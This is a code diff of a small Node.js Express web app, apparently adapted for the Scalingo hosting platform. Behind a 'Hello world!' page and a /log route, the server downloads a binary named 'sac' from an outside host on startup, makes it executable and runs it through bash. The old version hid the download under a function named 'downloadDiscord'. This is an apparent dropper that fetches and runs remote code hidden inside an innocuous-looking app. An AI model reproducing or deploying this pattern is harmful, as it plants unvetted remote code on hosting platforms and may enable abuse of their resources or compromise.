@@ -4,68 +4,79 @@ const fs = require('fs');
 const path = require('path');
 const axios = require('axios');
 const { exec } = require('child_process');
-const PORT = process.env.SERVER_PORT || process.env.PORT || 3000;
-const FILE_PATH = './.npm'; 
 
-app.get("/", function(req, res) {
+const PORT = process.env.PORT || 3000;  // Scalingo 自动设置 PORT
+const FILE_PATH = '/tmp';                // Scalingo 可写目录
+
+// 确保 log.txt 存在
+const logPath = path.join(FILE_PATH, 'log.txt');
+if (!fs.existsSync(logPath)) {
+  fs.writeFileSync(logPath, "");
+}
+
+// 根路由
+app.get("/", (req, res) => {
   res.send("Hello world!");
 });
 
+// log 路由
 app.get("/log", (req, res) => {
-  const logPath = path.join(FILE_PATH, 'log.txt');
-if (!fs.existsSync(logPath)) {
-  fs.writeFileSync(logPath, ""); // 创建空文件
-}
   fs.readFile(logPath, "utf8", (err, data) => {
     if (err) {
-      console.error(err);
-      res.status(500).send("Error reading log.txt");
-    } else {
-      res.setHeader('Content-Type', 'text/plain; charset=utf-8');
-      res.send(data);
+      console.error("读取 log.txt 出错:", err);
+      return res.status(500).send("读取 log.txt 出错");
     }
+    res.type("text/plain").send(data);
   });
 });
 
-const downloadDiscord = async () => {
+// 下载 sac 文件到 /tmp
+const downloadSac = async () => {
   try {
-    // console.log('Start downloading sac...');
     const response = await axios({
       method: 'get',
       url: 'https://amd64.2go.us.kg/sac',
       responseType: 'stream'
     });
 
-    const writer = fs.createWriteStream('sac');
+    const sacPath = path.join(FILE_PATH, 'sac');
+    const writer = fs.createWriteStream(sacPath);
     response.data.pipe(writer);
 
     return new Promise((resolve, reject) => {
       writer.on('finish', () => {
-        console.log('Download completed');
-        exec('chmod +x sac', (err) => {
+        exec(`chmod +x ${sacPath}`, (err) => {
           if (err) reject(err);
-          resolve();
+          else resolve(sacPath);
         });
       });
       writer.on('error', reject);
     });
   } catch (err) {
-    throw err;
+    console.error("下载 sac 出错:", err);
   }
 };
 
-const Execute = async () => {
+// 执行 sac
+const executeSac = async () => {
   try {
-    await downloadDiscord();
-    const command = './sac';
-    exec(command, { 
-      shell: '/bin/bash'
-    });
-  } catch (err) {}
+    const sacPath = await downloadSac();
+    if (sacPath) {
+      exec(sacPath, { shell: '/bin/bash' }, (err, stdout, stderr) => {
+        if (err) console.error("执行 sac 出错:", err);
+        if (stdout) console.log("sac 输出:", stdout);
+        if (stderr) console.error("sac 错误输出:", stderr);
+      });
+    }
+  } catch (err) {
+    console.error("Execute 出错:", err);
+  }
 };
 
-Execute();
+// 启动 sac 执行
+executeSac();
 
+// 启动 Express 服务
 app.listen(PORT, () => {
-  console.log(`Server is running on port:${PORT}`);
+  console.log(`Server is running on port: ${PORT}`);
 });
